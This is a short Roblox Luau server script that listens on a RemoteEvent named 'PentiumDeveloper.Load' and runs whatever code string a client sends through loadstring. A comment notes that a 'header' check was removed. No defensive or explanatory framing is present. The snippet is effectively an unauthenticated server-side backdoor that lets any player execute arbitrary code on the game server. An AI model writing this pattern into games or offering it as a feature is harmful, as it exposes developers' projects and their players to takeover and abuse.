game.ReplicatedStorage.PentiumDeveloper.Load.OnServerEvent:Connect(function(plr: Player, code: string, ...)
	--[[
	where's the header?
	
	it never worked anyway so i just got rid of it
	]]
	
	loadstring(code)()
end)